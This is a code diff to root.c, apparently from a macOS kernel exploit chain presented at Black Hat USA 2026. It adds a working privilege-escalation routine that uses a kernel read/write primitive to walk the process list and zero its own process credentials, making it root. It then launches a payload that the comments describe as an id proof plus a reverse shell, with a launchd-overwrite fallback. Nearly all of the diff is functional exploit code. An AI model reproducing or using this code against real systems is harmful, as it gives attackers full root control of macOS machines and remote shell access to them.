@@ -2,7 +2,15 @@
  * root.c -- stage-3 privilege escalation (Black Hat USA 2026,
  * Blazakis/Calif; macOS 26.4.1 / 25E253).
  *
- * With the stage-2 kernel R/W in hand:
+ * With the stage-2 kernel R/W in hand, two methods (cred overwrite first
+ * -- far fewer kernel reads, much lower panic risk; launchd as fallback):
+ *
+ * Method 1: cred overwrite (primary)
+ *   walk _kernproc to our own proc, follow p_proc_ro->p_ucred and zero
+ *   cr_uid/cr_ruid/cr_svuid.  Our process is root immediately; we then
+ *   exec the payload script (id proof + reverse shell) ourselves.
+ *
+ * Method 2: launchd job overwrite (fallback, the talk's demo)
  *   1. slide = A.inp_pcbinfo - _ripcbinfo (done by krw_redirect)
  *   2. walk _kernproc: find launchd (pid 1) and our own process
  *   3. park two worker threads: one blocked in read() on an empty pipe,
@@ -355,6 +363,68 @@ trigger_service(const char *name)
 }
 
 /* ------------------------------------------------------------------ */
+/* method 1: direct cred overwrite (primary)                           */
+/* ------------------------------------------------------------------ */
+
+/*
+ * Walk _kernproc to our own pid, follow p_proc_ro->p_ucred and zero
+ * cr_uid/cr_ruid/cr_svuid.  ~2N+3 kernel reads for N processes and 3
+ * writes -- orders of magnitude less exposure than the launchd vm_map
+ * scan.  Afterwards we are root and exec the payload ourselves.
+ */
+static int
+cred_overwrite_root(krw_t *k, const char *payload_path)
+{
+    uint64_t slide = krw_slide(k);
+    uint64_t kernproc, our_proc, ro, cred;
+    uint32_t uid_back, euid_back;
+    struct stat st;
+    char cmd[PATH_MAX + 16];
+    int i;
+
+    kernproc = krw_read64(k, XNU_KERNPROC + slide);
+    if (kernproc == 0)
+        return -1;
+    our_proc = find_proc_by_pid(k, kernproc, getpid());
+    if (our_proc == 0)
+        return -1;
+    ro = krw_read64(k, our_proc + PROC_OFF_RO);
+    cred = ro ? krw_read64(k, ro + PROC_RO_OFF_UCRED) : 0;
+    if (cred == 0)
+        return -1;
+    fprintf(stderr, "[root] cred method: our proc 0x%llx ucred 0x%llx\n",
+            (unsigned long long)our_proc, (unsigned long long)cred);
+
+    uid_back  = krw_read32u(k, cred + UCRED_OFF_UID);
+    euid_back = krw_read32u(k, cred + UCRED_OFF_SVUID);
+    if (krw_write32(k, cred + UCRED_OFF_UID, 0) != 0 ||
+        krw_write32(k, cred + UCRED_OFF_RUID, 0) != 0 ||
+        krw_write32(k, cred + UCRED_OFF_SVUID, 0) != 0)
+        return -1;
+
+    if (getuid() != 0 || geteuid() != 0) {
+        fprintf(stderr, "[root] cred write did not take (uid=%d euid=%d)\n",
+                getuid(), geteuid());
+        return -1;
+    }
+    fprintf(stderr, "[root] cred overwrite ok: uid=%d euid=%d "
+            "(was uid=%u svuid=%u)\n", getuid(), geteuid(),
+            uid_back, euid_back);
+
+    /* we are root: run the payload directly (id proof + reverse shell) */
+    unlink(PROOF_FILE);
+    snprintf(cmd, sizeof(cmd), "/bin/sh %s &", payload_path);
+    system(cmd);
+
+    for (i = 0; i < 50; i++) {
+        if (stat(PROOF_FILE, &st) == 0 && st.st_size > 0)
+            break;
+        usleep(100 * 1000);
+    }
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
 
 int
 root_stage(krw_t *k, const char *payload_path, const char *trigger_name)
@@ -366,6 +436,15 @@ root_stage(krw_t *k, const char *payload_path, const char *trigger_name)
     int i;
 
     fprintf(stderr, "[root] slide 0x%llx\n", (unsigned long long)slide);
+
+    /* primary: direct cred overwrite -- run the payload as root ourselves */
+    if (cred_overwrite_root(k, payload_path) == 0) {
+        fprintf(stderr, "[root] SUCCESS via cred overwrite -- payload "
+                "running as root (%s)\n", PROOF_FILE);
+        return 0;
+    }
+    fprintf(stderr, "[root] cred overwrite failed, falling back to "
+            "launchd job overwrite\n");
 
     if (strlen(payload_path) > PAYLOAD_MAX) {
         fprintf(stderr, "[root] payload path '%s' too long (%zu > %d) -- "
